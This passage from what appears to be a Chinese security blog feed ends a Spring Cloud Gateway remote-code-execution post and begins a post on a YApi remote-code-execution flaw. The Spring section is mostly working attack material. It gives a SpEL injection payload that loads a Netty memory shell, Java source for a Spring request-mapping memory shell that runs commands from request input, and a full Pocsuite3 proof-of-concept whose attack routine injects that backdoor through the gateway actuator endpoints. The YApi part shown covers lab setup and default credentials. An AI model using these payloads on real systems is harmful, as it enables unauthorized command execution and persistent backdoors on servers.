class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.131:9000<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>0<br><br><br></code></pre></td></tr></table></figure><h2 id="利用模块编写"><a href="#利用模块编写" class="headerlink" title="利用模块编写"></a>利用模块编写</h2><p>注入内存马</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(<span class="hljs-string">&#x27;NettyMemshell&#x27;</span>,T(org.springframework.util.Base64Utils).decodeFromString(<span class="hljs-string">&#x27;yv66vgAAADQBEgoxxxxx&#x27;</span>),<span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.management.loading.MLet(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL[<span class="hljs-number">0</span>],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br> <span class="hljs-string">&quot;predicates&quot;</span>: [<br> &#123;<br> <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Path&quot;</span>,<br> <span class="hljs-string">&quot;args&quot;</span>: &#123;<br> <span class="hljs-string">&quot;_genkey_0&quot;</span>: <span class="hljs-string">&quot;/new_route/**&quot;</span><br>&#125;<br>&#125;<br>],<br><span class="hljs-string">&quot;filters&quot;</span>: [<br> &#123;<br> <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;RewritePath&quot;</span>,<br> <span class="hljs-string">&quot;args&quot;</span>: &#123;<br> <span class="hljs-string">&quot;_genkey_0&quot;</span>: <span class="hljs-string">&quot;#&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;NettyMemshell&#x27;,T(org.springframework.util.Base64Utils).decodeFromString(&#x27;yv66vgAxxxxxx&#x27;),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()&#125;&quot;</span>,<br> <span class="hljs-string">&quot;_genkey_1&quot;</span>: <span class="hljs-string">&quot;/$&#123;path&#125;&quot;</span><br> &#125;<br>&#125;<br>],<br><span class="hljs-string">&quot;uri&quot;</span>: <span class="hljs-string">&quot;https://wya.pl&quot;</span>,<br><span class="hljs-string">&quot;order&quot;</span>: <span class="hljs-number">0</span><br>        &#125;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringRequestMappingMemshell</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">doInject</span><span class="hljs-params">(Object requestMappingHandlerMapping)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;inject-start&quot;</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">registerHandlerMethod</span> <span class="hljs-operator">=</span> requestMappingHandlerMapping.getClass().getDeclaredMethod(<span class="hljs-string">&quot;registerHandlerMethod&quot;</span>, Object.class, Method.class, RequestMappingInfo.class);<br>            registerHandlerMethod.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">executeCommand</span> <span class="hljs-operator">=</span> SpringRequestMappingMemshell.class.getDeclaredMethod(<span class="hljs-string">&quot;executeCommand&quot;</span>, String.class);<br>            <span class="hljs-type">PathPattern</span> <span class="hljs-variable">pathPattern</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PathPatternParser</span>().parse(<span class="hljs-string">&quot;/*&quot;</span>);<br>            <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">patternsRequestCondition</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(pathPattern);<br>            <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">requestMappingInfo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(<span class="hljs-string">&quot;&quot;</span>, patternsRequestCondition, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>            registerHandlerMethod.invoke(requestMappingHandlerMapping, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpringRequestMappingMemshell</span>(), executeCommand, requestMappingInfo);<br>            msg = <span class="hljs-string">&quot;inject-success&quot;</span>;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            msg = <span class="hljs-string">&quot;inject-error&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> msg;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> ResponseEntity <span class="hljs-title function_">executeCommand</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">execResult</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next();<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseEntity</span>(execResult, HttpStatus.OK);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1657198489875-7eb40d51-a55b-41ce-b1a5-f30d509a02db.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1657198507553-b2906fd4-4d0a-4fce-b813-6a4677596d4d.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1657198590079-e034bd16-a55e-4a6c-b72d-0a673605cdef.png" alt="image.png"></p><h3 id="Pocsuite3-编写"><a href="#Pocsuite3-编写" class="headerlink" title="Pocsuite3 编写"></a>Pocsuite3 编写</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">If you have issues about development, please read:</span><br><span class="hljs-string">https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md</span><br><span class="hljs-string">for more about information, plz visit http://pocsuite.org</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br>from pocsuite3.api import Output<span class="hljs-punctuation">,</span> POCBase<span class="hljs-punctuation">,</span> register_poc<span class="hljs-punctuation">,</span> requests<span class="hljs-punctuation">,</span> logger<br>from pocsuite3.api import get_listener_ip<span class="hljs-punctuation">,</span> get_listener_port<br>from pocsuite3.api import REVERSE_PAYLOAD<br>from pocsuite3.lib.utils import random_str<br>from requests.exceptions import ReadTimeout<br>import re<br><br>class DemoPOC(POCBase)<span class="hljs-punctuation">:</span><br>    vulID = <span class="hljs-string">&quot;xxx&quot;</span>  # ssvid ID 如果是提交漏洞的同时提交 PoC<span class="hljs-punctuation">,</span>则写成 <span class="hljs-number">0</span><br>    version = <span class="hljs-string">&quot;xxx&quot;</span>  # 默认为<span class="hljs-number">1</span><br>    author = <span class="hljs-string">&quot;mizihaxi &amp; zhui&quot;</span>  # PoC作者的大名<br>    vulDate = <span class="hljs-string">&quot;2022-03-08&quot;</span>  # 漏洞公开的时间<span class="hljs-punctuation">,</span>不知道就写今天<br>    createDate = <span class="hljs-string">&quot;2022-04-13&quot;</span>  # 编写 PoC 的日期<br>    updateDate = <span class="hljs-string">&quot;2022-07-07&quot;</span>  # PoC 更新的时间<span class="hljs-punctuation">,</span>默认和编写时间一样<br>    references = <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;https://xxx.xx.com.cn&quot;</span><span class="hljs-punctuation">]</span>  # 漏洞地址来源<span class="hljs-punctuation">,</span><span class="hljs-number">0</span>day不用写<br>    name = <span class="hljs-string">&quot;Spring Cloud Gateway Rce&quot;</span>  # PoC 名称<br>    appPowerLink = <span class="hljs-string">&quot;xx&quot;</span>  # 漏洞厂商主页地址<br>    appName = <span class="hljs-string">&quot;Spring Cloud Gateway&quot;</span>  # 漏洞应用名称<br>    appVersion = <span class="hljs-string">&quot;3.1.0, 3.0.0--3.0.6, .....&quot;</span>  # 漏洞影响版本<br>    samples = <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span>  # 测试样列<span class="hljs-punctuation">,</span>就是用 PoC 测试成功的网站<br>    install_requires = <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span>  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写<br>    desc = <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">            当启用和暴露 Gateway Actuator 端点时，使用 Spring Cloud Gateway 的应用程序可受到代码注入攻击。攻击者可以发送特制的恶意请求，从而远程执行任意代码。</span><br><span class="hljs-string">        &quot;</span><span class="hljs-string">&quot;&quot;</span>  # 漏洞简要描述<br>    pocDesc = <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">            # verify</span><br><span class="hljs-string">            python3 cli.py -r springgatewayrce.py -u http://xxx</span><br><span class="hljs-string">            </span><br><span class="hljs-string">            # attack</span><br><span class="hljs-string">            # 注入内存马，header添加 cmd: whoami</span><br><span class="hljs-string">            python3 cli.py -r springgatewayrce.py -u http://xxx  --attack</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 注：内存马注入后，删除规则依然可以访问，重启服务kill内存马</span><br><span class="hljs-string">            </span><br><span class="hljs-string">        &quot;</span><span class="hljs-string">&quot;&quot;</span>  # POC用法描述<br><br><br><br><br><br><br><br>    def _verify(self)<span class="hljs-punctuation">:</span><br>        # 输出相关<br>        # print(<span class="hljs-string">&quot;0000000000000SSSS&quot;</span>)<br>        result = <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>        if self.url<span class="hljs-punctuation">[</span><span class="hljs-number">-1</span><span class="hljs-punctuation">]</span> == <span class="hljs-attr">&quot;/&quot;</span><span class="hljs-punctuation">:</span><br>            domain = self.url<span class="hljs-punctuation">[</span><span class="hljs-punctuation">:</span><span class="hljs-number">-1</span><span class="hljs-punctuation">]</span><br>        else<span class="hljs-punctuation">:</span><br>            domain = self.url<br>        # print(<span class="hljs-string">&quot;11111&quot;</span>)<br>        try<span class="hljs-punctuation">:</span><br>            headers1 = <span class="hljs-punctuation">&#123;</span><br>                &#x27;Accept-Encoding&#x27;<span class="hljs-punctuation">:</span> &#x27;gzip<span class="hljs-punctuation">,</span> deflate&#x27;<span class="hljs-punctuation">,</span><br>                &#x27;Accept&#x27;<span class="hljs-punctuation">:</span> &#x27;*<span class="hljs-comment">/*&#x27;,</span><br><span class="hljs-comment">                &#x27;Accept-Language&#x27;: &#x27;en&#x27;,</span><br><span class="hljs-comment">                &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&#x27;,</span><br><span class="hljs-comment">                &#x27;Content-Type&#x27;: &#x27;application/json&#x27;</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">            headers2 = &#123;</span><br><span class="hljs-comment">                &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&#x27;,</span><br><span class="hljs-comment">                &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">            payload = &#x27;&#x27;&#x27;&#123;\r</span><br><span class="hljs-comment">            &quot;id&quot;: &quot;hacktest&quot;,\r</span><br><span class="hljs-comment">            &quot;filters&quot;: [&#123;\r</span><br><span class="hljs-comment">                &quot;name&quot;: &quot;AddResponseHeader&quot;,\r</span><br><span class="hljs-comment">                &quot;args&quot;: &#123;&quot;name&quot;: &quot;Result&quot;,&quot;value&quot;: &quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\\&quot;whoami\\&quot;&#125;).getInputStream()))&#125;&quot;&#125;\r</span><br><span class="hljs-comment">                &#125;],\r</span><br><span class="hljs-comment">            &quot;uri&quot;: &quot;http://example.com&quot;,\r</span><br><span class="hljs-comment">            &quot;order&quot;: 0\r</span><br><span class="hljs-comment">            &#125;&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">            url = domain</span><br><span class="hljs-comment">            re1 = requests.post(url=url + &quot;/actuator/gateway/routes/hacktest&quot;,data=payload,headers=headers1)</span><br><span class="hljs-comment">            # print(&quot;222222&quot;)</span><br><span class="hljs-comment">            # print(re1.status_code)</span><br><span class="hljs-comment">            # print(&quot;######################SSSS&quot;)</span><br><span class="hljs-comment">            re2 = requests.post(url=url + &quot;/actuator/gateway/refresh&quot; ,headers=headers2)</span><br><span class="hljs-comment">            re3 = requests.get(url=url + &quot;/actuator/gateway/routes/hacktest&quot;,headers=headers2)</span><br><span class="hljs-comment">            re4 = requests.delete(url=url + &quot;/actuator/gateway/routes/hacktest&quot;,headers=headers2)</span><br><span class="hljs-comment">            re5 = requests.post(url=url + &quot;/actuator/gateway/refresh&quot; ,headers=headers2)</span><br><span class="hljs-comment">            re3_text = re3.text</span><br><span class="hljs-comment">            # print(re3.text)</span><br><span class="hljs-comment">            re3_code = re3.status_code</span><br><span class="hljs-comment">            # print(re3_text)</span><br><span class="hljs-comment">            if re3_code==200:</span><br><span class="hljs-comment">                re3_text = re3_text.replace(&quot;&#x27;&quot;, &#x27;&#x27;)</span><br><span class="hljs-comment">                re3_text = re3_text.replace(&quot; &quot;, &#x27;&#x27;)</span><br><span class="hljs-comment">                re3_text = re3_text.replace(&quot;\\n&quot;, &#x27;&#x27;)</span><br><span class="hljs-comment">                req_huixian_re = re.compile(r&#x27;AddResponseHeaderResult=(.*?)],&#x27;)</span><br><span class="hljs-comment">                req_huixian_re_1 = req_huixian_re.findall(re3_text, re.S)</span><br><span class="hljs-comment">                huixian = req_huixian_re_1[0]</span><br><span class="hljs-comment">                print(f&#x27;[+]获取回显命令成功：&#123;huixian&#125;&#x27;)</span><br><span class="hljs-comment">                result[&#x27;VerifyInfo&#x27;] = &#123;&#125;</span><br><span class="hljs-comment">                result[&#x27;VerifyInfo&#x27;][&#x27;Url&#x27;] = &quot;&#123;&#125;  \nUser:&#123;&#125;&quot;.format(domain, huixian)</span><br><span class="hljs-comment">                return self.parse_verify(result)</span><br><span class="hljs-comment">            else:</span><br><span class="hljs-comment">                # print(req_huixian_code)</span><br><span class="hljs-comment">                print(&#x27;[-]获取回显失败，请手动测试&#x27;)</span><br><span class="hljs-comment">        except requests.exceptions.RequestException:</span><br><span class="hljs-comment">            print(&#x27;[-]获取回显超时&#x27;)</span><br><span class="hljs-comment">        except:</span><br><span class="hljs-comment">            print(&#x27;[-]获取回显异常，请手动测试&#x27;)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    def _attack(self):</span><br><span class="hljs-comment">        url = self.url</span><br><span class="hljs-comment">        result = &#123;&#125;</span><br><span class="hljs-comment">        headers1 = &#123;</span><br><span class="hljs-comment">            &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;,</span><br><span class="hljs-comment">            &#x27;Accept&#x27;: &#x27;*/</span>*&#x27;<span class="hljs-punctuation">,</span><br>            &#x27;Accept-Language&#x27;<span class="hljs-punctuation">:</span> &#x27;en&#x27;<span class="hljs-punctuation">,</span><br>            &#x27;User-Agent&#x27;<span class="hljs-punctuation">:</span> &#x27;Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML<span class="hljs-punctuation">,</span> like Gecko) Chrome/<span class="hljs-number">97.0</span><span class="hljs-number">.4692</span><span class="hljs-number">.71</span> Safari/<span class="hljs-number">537.36</span>&#x27;<span class="hljs-punctuation">,</span><br>            &#x27;Content-Type&#x27;<span class="hljs-punctuation">:</span> &#x27;application/json&#x27;<br>        <span class="hljs-punctuation">&#125;</span><br>        payload2 = &#x27;&#x27;&#x27;<span class="hljs-punctuation">&#123;</span>\r<br>          <span class="hljs-attr">&quot;predicates&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>\r<br>            <span class="hljs-punctuation">&#123;</span>\r<br>              <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Path&quot;</span><span class="hljs-punctuation">,</span>\r<br>              <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>\r<br>                <span class="hljs-attr">&quot;_genkey_0&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/new_route/**&quot;</span>\r<br>              <span class="hljs-punctuation">&#125;</span>\r<br>            <span class="hljs-punctuation">&#125;</span>\r<br>          <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>\r<br>          <span class="hljs-attr">&quot;filters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>\r<br>            <span class="hljs-punctuation">&#123;</span>\r<br>              <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;RewritePath&quot;</span><span class="hljs-punctuation">,</span>\r<br>              <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>\r<br>                <span class="hljs-attr">&quot;_genkey_0&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;NettyMemshell&#x27;,T(org.springframework.util.Base64Utils).decodeFromString(&#x27;yv66vgAAAxxxx&#x27;),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()&#125;&quot;</span><span class="hljs-punctuation">,</span>\r<br>                <span class="hljs-attr">&quot;_genkey_1&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/$&#123;path&#125;&quot;</span>\r<br>              <span class="hljs-punctuation">&#125;</span>\r<br>            <span class="hljs-punctuation">&#125;</span>\r<br>          <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>\r<br>          <span class="hljs-attr">&quot;uri&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://wya.pl&quot;</span><span class="hljs-punctuation">,</span>\r<br>          <span class="hljs-attr">&quot;order&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span>\r<br>        <span class="hljs-punctuation">&#125;</span>&#x27;&#x27;&#x27;<br>        shell_header = headers1 = <span class="hljs-punctuation">&#123;</span><br>            &#x27;Accept-Encoding&#x27;<span class="hljs-punctuation">:</span> &#x27;gzip<span class="hljs-punctuation">,</span> deflate&#x27;<span class="hljs-punctuation">,</span><br>            &#x27;Accept&#x27;<span class="hljs-punctuation">:</span> &#x27;*<span class="hljs-comment">/*&#x27;,</span><br><span class="hljs-comment">            &#x27;Accept-Language&#x27;: &#x27;en&#x27;,</span><br><span class="hljs-comment">            &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&#x27;,</span><br><span class="hljs-comment">            &#x27;Content-Type&#x27;: &#x27;application/json&#x27;,</span><br><span class="hljs-comment">            &#x27;cmd&#x27;: &#x27;whoami&#x27;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">        refresh = &quot;a=1&quot;</span><br><span class="hljs-comment">        shell_add = requests.post(url=url + &quot;/actuator/gateway/routes/hacker&quot;,headers=headers1,data=payload2).status_code</span><br><span class="hljs-comment">        shell_refresh = requests.post(url=url + &quot;/actuator/gateway/refresh&quot;,headers=headers1,data=refresh).status_code</span><br><span class="hljs-comment">        if shell_add == 201:</span><br><span class="hljs-comment">            shell = requests.get(url=url,headers=headers1).text</span><br><span class="hljs-comment">            print(f&#x27;[+]内存马注入成功：&#123;shell&#125;&#x27;)</span><br><span class="hljs-comment">            print(&#x27;header 添加 cmd: whoami&#x27;)</span><br><span class="hljs-comment">            result[&#x27;VerifyInfo&#x27;] = &#123;&#125;</span><br><span class="hljs-comment">            return self.parse_verify(result)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    # 结果输出</span><br><span class="hljs-comment">    def parse_verify(self, result):</span><br><span class="hljs-comment">        output = Output(self)</span><br><span class="hljs-comment">        if result:</span><br><span class="hljs-comment">            output.success(result)</span><br><span class="hljs-comment">        else:</span><br><span class="hljs-comment">            output.fail(&#x27;[-]目标不存在&#x27;)</span><br><span class="hljs-comment">        return output</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">register_poc(DemoPOC)</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Yapi Rce</title>
    <link href="/2022/01/06/YApi%20_1.12.0%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2022/01/06/YApi%20_1.12.0%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="YApi平台简介"><a href="#YApi平台简介" class="headerlink" title="YApi平台简介"></a>YApi平台简介</h2><p>YApi 是<strong>高效</strong>、<strong>易用</strong>、<strong>功能强大</strong>的 api 管理平台，旨在为开发、产品、测试人员提供更优雅的接口管理服务。可以帮助开发者轻松创建、发布、维护 API，YApi 还为用户提供了优秀的交互体验，开发人员只需利用平台提供的接口数据写入工具以及简单的点击操作就可以实现接口的管理。<br><a href="https://github.com/YMFE/yapi/tree/master">https://github.com/YMFE/yapi/tree/master</a></p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>YApi 是一个支持本地部署的可视化接口管理平台。YApi 在 1.12.0 之前的版本(目前所有版本)中由于 base.js 没有正确对 token 参数进行正确过滤，导致存在远程代码执行漏洞。攻击者可通过MongoDB注入获取用户 token，其中包括用户ID、项目ID等参数。yapi后台的pre-request和pre-response方法存在缺陷点，通过注入调用自动化测试接口runAutoTest()，进而利用沙箱逃逸触发命令执行。</p><h2 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h2><p><code>YApi &lt; 1.12.0</code></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>docker 搭建 <a href="https://github.com/fjc0k/docker-YApi">https://github.com/fjc0k/docker-YApi</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">git clone https:<span class="hljs-comment">//github.com/fjc0k/docker-YApi.git</span><br>vim docker-compose.yml<br>docker-compose up -d<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1672281603896-bb245906-b017-4df5-965d-d5f216cc1cb8.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1672282199866-d0e7a3a0-56f5-4b44-af9c-d80f5bfdc047.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">页面地址：http:<span class="hljs-comment">//xxxxx:40001</span><br><br>默认用户名：admin@docker.yapi<br><br>默认密码：adm1n<br></code></pre></td></tr></table></figure><p><img 